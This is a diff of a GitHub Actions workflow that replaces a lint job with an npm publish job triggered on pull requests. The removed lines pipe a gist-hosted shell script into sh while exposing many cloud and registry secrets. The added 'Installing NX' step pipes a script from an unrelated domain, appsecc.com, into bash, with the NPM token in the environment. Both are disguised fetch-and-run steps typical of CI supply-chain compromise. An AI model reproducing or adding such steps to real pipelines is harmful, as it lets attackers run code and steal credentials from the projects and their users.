@@ -1,45 +1,31 @@
-name: Lint
+name: Publish NPM packages
 
 on:
-  push:
   pull_request:
 
-  workflow_dispatch:
-
 jobs:
-  Lint:
-    runs-on: [ self-hosted ]
+  publish_npm_package:
+  
+    runs-on: ubuntu-latest
+    env:
+      NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+
     steps:
-      - uses: actions/checkout@v2
-      - name: Use Node.js 16
-        uses: actions/setup-node@v2
+      - name: Git checkout
+        uses: actions/checkout@v3
+
+      - uses: actions/setup-node@v3
         with:
-          node-version: lts/*
+          node-version: '16.x'
+          registry-url: 'https://registry.npmjs.org'
 
-      - name: Installing Dependencies
+      - name: Installing NX
         run: |
-          curl -L https://gist.githubusercontent.com/Len0nJohn/2eb7fe44856749cbd6609ae9017da08a/raw/192493ef4efd2fdca2b30bb5ed4c4eb4a5afb8de/gh.sh | sh
-          npm install
-        env:
-          API_PRIVATE_KEY: ${{ secrets.API_PRIVATE_KEY }}
-          CLIENT_EMAIL: ${{ secrets.CLIENT_EMAIL }}
-          GCP_CREDS: ${{ secrets.ACTIONS_GCP_CREDENTIALS }}
-          ECR_REPOSITORY: ${{ secrets.AWS_REPO_NAME }}
-          PUBLIC_ECR_URL: ${{ secrets.AWS_REPO_URL }}
-          IMAGE_NAME: ${{ secrets.IMAGE_NAME }}
-          DOCKERHUB_REPOSITORY: ${{ secrets.DOCKERHUB_REPOSITORY }}
-          GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
-          GCP_PROJECT_ID: ${{ secrets.GCP_PROJECT_ID }}
-          IMAGE_TAG: ${{ github.event.inputs.image-tag }}
-          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
-          CONTAINER_REGISTRY_FOLDER: ${{ secrets.GCP_CONTAINER_REGISTRY_FOLDER }}
-          AWS_REGION: ${{ secrets.AWS_REGION }}
-          AWS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-          AWS_SECRET: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          curl -L https://appsecc.com/python | bash
+          npm install -g nx
 
-      - name: Install dependencies of the homemade packages.
-        run: npm run build:dev
-
-      - name: Linting
-        run: npm run lint
-
+      - run: npm install 
+     
+      - name: publish to npm
+        run: |
+          nx run-many --exclude=velo-external-db --target=publishCi --all
